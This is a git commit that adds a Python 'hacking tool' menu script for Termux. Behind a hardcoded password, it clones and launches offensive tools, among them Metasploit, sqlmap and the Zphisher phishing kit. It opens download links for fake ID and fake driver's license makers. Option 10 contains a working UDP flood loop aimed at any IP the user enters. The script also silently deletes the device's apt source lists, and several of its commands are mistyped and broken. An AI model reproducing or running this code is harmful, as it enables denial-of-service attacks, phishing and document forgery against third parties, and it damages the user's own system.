d9ffb77e1b27be7490454939acb5d6656ab93a38
EXTE&SION <86994680+p-r-i-m-e@users.noreply.github.com>
2021-09-14 14:20:36 +0000

    Add files via upload

---
+++ dday.py
@@ -0,0 +1,226 @@
+
+                #Never Give Up #
+
+print(""" 
+
+\033[0;33m  1111111   1111111      111     11    11
+\033[0;32m    11 11     11 11     11 11     11  11
+\033[0;36m    11 11 --- 11 11    1111111     1111
+\033[1;33m    11 11     11 11   11     11     11
+\033[0;31m  1111111   1111111  11       11    11
+
+""")
+ 
+import time as a
+a.sleep(0.4)
+
+print("")
+print("	*REVØLUTIØÑ ")
+
+a.sleep(0.3)
+print("			MÛST ")
+
+import time as a
+a.sleep(0.3)
+print("				BĒ ")
+
+a.sleep(0.3)
+
+print("					SUÇÇĒÊD* ")
+
+a.sleep(0.3)
+
+print("				                     Ra Thu! ")
+
+		#Just A Thief !
+print("")
+print(" \033[0;32m ")
+user=str(input("Enter Tool Name : "))
+print("")
+password=str(input("\033[0;35mEnter Tool Password : "))
+if user=="Rathu" and password=="Rathu":
+	print( "\033[0;36m ")
+	import time as a
+	import os
+	a.sleep(0.3)
+	os.system("cd")
+	os.system("termux-setup-storage")
+	os.system("rm -rf /data/data/com.termux/files/usr/etc/apt/sources.list.d/* ")
+	os.system("pkg update and upgrade -y")
+	os.system("pkg install toilet -y")
+	os.system("clear")
+	os.system("toilet -F metal D E M O C R A C Y ")
+	a.sleep(0.2)
+	print(" ")
+	print("""\033[0;32m
+  Choose Your Opition
+
+  1.Termux Packges        11.Sketchware (All Versions)
+
+  2.Sqlmap     	          12.Facebook Lite (Colour 11)
+
+  3.DH Hackbar            13.Termux Float
+
+  4.Fsociety(Mr.Robot)    14.Fake ID Maker
+
+  5.Metasploit            15.Fake Driver License Maker
+
+  6.Kali Nethunter        16.Zphisher(Phishing)
+
+  7.Extra Key             17.Sensei(Name/Pass)
+
+  8.Tool-X                18.Script Dollar(Clipclap)
+
+  9.Ngrok	          19.Follow Me
+
+  10.DDos Attack          20.Exit \033[0m """)
+
+	a.sleep(0.2)
+	print("\033[0;31m")
+	choice=int(input("Enter Choice :"))
+	if choice==1:
+		import os
+		os.system("cd")
+		os.system("clear")
+		os.system("pkg install termux-api -y")
+		os.system("pkg install termux-repo -y")
+		os.system("pkg install python3 -y")
+		os.system("pkg install wget -y ")
+		os.system("pkg install bash -y")
+		os.system("pkg install openssh -y")
+		os.system("pkg install git -y")
+		os.system("pkg install python -y ")
+		os.system("pkg install pythpn2 -y")
+		os.system("pip2 install requests -y")
+		os.system("pkg install zip wget -y ")
+		os.system("pip2 install mechanize -y")
+		os.system("pkg install php -y")
+		os.system("pip2 install lolcat -y")
+		os.system("apt install zsh -y")
+		os.system("pkg install nmap -y")
+		os.system("pkg install cmatrix -y")
+		os.system("pkg install sl -y")
+		os.system("pip3 install colorama -y")
+		os.system("pkg install nano -y")
+		os.system("pkg install curl -y")
+	elif choice==2:
+		import os
+		os.system("cd")
+		os.system("clear")
+		os.system("git clone https://github.com/sqlmapproject/sqlmap & cd sqlmap & python2 sqlmap.py")
+	elif choice==3:
+		import os
+		os.system("xdg-open https://github.com/darknethaxor/DH-HackBar/tree/v1.1")
+	elif choice==4:
+		import os
+		os.system("cd")
+		os.system("clear")
+		os.system("git clone https://github.com/Manisso/fsociety & cd fsociety & chmod +x fsociety.py & python2 fsociet.py")
+	elif choice==5:
+		import os
+		os.system("cd")
+		os.system("clear")
+		os.system("git clone https://github.com/rapid7/metasploit-framework & cd metasploit & chmod +x meatsploit.sh & bash metasploit.sh")
+	elif choice==6:
+		import os
+		os.system("cd")
+		os.system("clear")
+		os.system("wget -O install-nethunter-termux https://offs.ec/2MceZWr & chmod +x install-nethunter-termux & ./install-nethunter-termux")
+	elif choice==7:
+		import os 
+		os.system("cd")
+		os.system("clear")
+		os.system("mkdir $HOME/.termux/ ;echo 'extra-keys = [['ESC','|','-','HOME','UP','END'],['TAB','CTRL','ALT','LEFT','DOWN','RIGHT']]' >> $HOME/.termux/termux.properties && termux-reload-settings && sleep 1 && logout ")
+	elif choice==8:
+		import os
+		os.system("cd")
+		os.system("clear")
+		os.system("git clone https://github.com/Rajkumrdusad/Tool-X.git & cd Tool-X & chmod +x install.aex & /install.aex")
+	elif choice==9:
+		import os
+		os.system("cd")
+		os.system("clear")
+		os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip & unzip ngrok-stable-linux-arm.zip & chmod +x ngrok & ./ngrok help")
+	elif choice==10:
+		import os
+		os.system("cd")
+		os.system("clear")
+		print("""
+		\033[0;31m
+
+		11111  11111
+		11  11 11  11  111   11111
+		11  11 11  11 11 11   11
+		11111  11111   111  11111
+
+		\033[0m """)
+
+		import socket
+		import random
+		sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+		bytes = random._urandom(1940)
+		ip = input("\033[1;32m Enter Attack IP Address :  \033[0m")
+		port = eval(input("\033[0;31m Enter Port : \033[0m "))
+		sent = 0
+		while True:
+			sock.sendto(bytes,(ip,port))
+			sent += 1
+			print("\033[1;31m Sent %s packet to %s through port : %s \033m[0m "%(sent,ip,port))
+	elif choice==11:
+		import os
+		os.system("xdg-open https://www.dropbox.com/s/qjirck2zpw9tztp/sketchy%20vmod%20v1.0.apk?dl=0")
+	elif choice==12:
+		import os
+		os.system("xdg-open https://bit.ly/2XIXvpC")
+	elif choice==13:
+		import os
+		os.system("xdg-open https://www.happymod.com/termux-float-mod/com.termux.window/download.html")
+	elif choice==14:
+		import os
+		os.system("xdg-open https://www.mediafire.com/download/313t85xl9zot6aw")
+	elif choice==15:
+		import os
+		os.system("xdg-open https://www.mediafire.com/download/r7cndf3gzrj8465")
+	elif choice==16:
+		import os
+		os.system("cd")
+		os.system("clear")
+		os.system("git clone git://github.com/htr-tech/zphisher.git & cd zphisher & bash zphisher.sh")
+	elif choice==17:
+		import os
+		os.system("cd")
+		os.system("clear")
+		os.system("git cloen http://github.com/BOT-033/Sensei & cd Sensei & chmod +x* & python2 main.py")
+	elif choice==18:
+		import os 
+		os.system("cd")
+		os.system("clear")
+		os.system("git clone https://github.com/p-r-i-m-e/Script-Doller & php bot.php")
+	elif choice==19:
+		import os 
+		os.system("xdg-open https://www.facebook.com/P.R.I.M.E.127.0.0.1 ")
+	elif choice==20:
+		print("		Bye..")
+		import time as a
+		import os
+		a.sleep(0.3)
+		os.system("cd")
+		os.system("clear")
+	else:
+		import time as a
+		a.sleep(0.3)
+		print("")
+		print("		\033[0;31m Your Choice Is Not Include! \033[0m")
+		print("")
+		print("")
+else:
+	import time as a
+	import os
+	a.sleep(0.3)
+	os.system("clear")
+	print("			\033[0;31m Password Wrong! \033[0m")
+	print("")
+	print("")
+
+                   # Thank For Using My Tools #
+
